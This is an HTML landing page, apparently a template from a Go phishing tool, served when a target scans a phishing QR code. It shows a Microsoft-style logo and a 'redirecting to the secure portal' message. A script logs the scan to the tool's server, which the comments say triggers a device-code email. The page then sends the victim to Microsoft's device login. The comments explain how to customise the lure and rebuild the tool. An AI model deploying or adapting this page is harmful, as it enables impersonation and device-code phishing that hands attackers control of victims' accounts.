<!DOCTYPE html>
<!--
  QR Phishing — Landing Page
  ==========================
  Served when a target scans the QR code.

  HOW TO CUSTOMIZE:
  - Change the redirect URL at the bottom of the <script> block.
  - Change the visual design (logo, text, colors) freely.
  - The fetch('/qr/{{TOKEN}}/confirm', ...) line MUST stay — it is what
    registers the scan and triggers the device code email.
  - {{TOKEN}} is replaced automatically by the server. Do not touch it.

  After editing, rebuild: go build -o entraith ./cmd/entraith
-->
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Loading…</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0 }
  body {
    background: #f5f5f5;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  }
  .card {
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 2px 16px rgba(0,0,0,0.10);
    padding: 40px 36px;
    text-align: center;
    max-width: 340px;
    width: 90vw;
  }
  .logo {
    width: 48px;
    height: 48px;
    margin: 0 auto 20px;
  }
  h1 {
    font-size: 18px;
    font-weight: 600;
    color: #1a1a1a;
    margin-bottom: 10px;
  }
  p {
    font-size: 14px;
    color: #666;
    line-height: 1.5;
  }
  .spinner {
    width: 28px;
    height: 28px;
    border: 3px solid #e0e0e0;
    border-top-color: #0078d4;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 24px auto 0;
  }
  @keyframes spin { to { transform: rotate(360deg) } }
</style>
</head>
<body>
<div class="card">
  <!-- Microsoft-style logo — swap this SVG for any logo you want -->
  <svg class="logo" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="2"  y="2"  width="20" height="20" fill="#f25022"/>
    <rect x="26" y="2"  width="20" height="20" fill="#7fba00"/>
    <rect x="2"  y="26" width="20" height="20" fill="#00a4ef"/>
    <rect x="26" y="26" width="20" height="20" fill="#ffb900"/>
  </svg>
  <h1>Redirecting you…</h1>
  <p>Please wait while we verify your request and redirect you to the secure portal.</p>
  <div class="spinner"></div>
</div>
<script>
(function() {
  // ── DO NOT REMOVE OR EDIT THIS BLOCK ──────────────────────────────────
  // keepalive:true ensures the browser sends this request even while
  // navigating away — without it, mobile browsers cancel the fetch before
  // it reaches the server, so the scan is never logged.
  fetch('/qr/{{TOKEN}}/confirm', {
    method: 'POST',
    keepalive: true,
    credentials: 'omit',
    headers: { 'Content-Type': 'application/json' },
    body: '{}'
  });
  // ──────────────────────────────────────────────────────────────────────

  // REDIRECT TARGET — change this URL to wherever the target should land.
  window.location.replace('https://microsoft.com/devicelogin');
})();
</script>
</body>
</html>
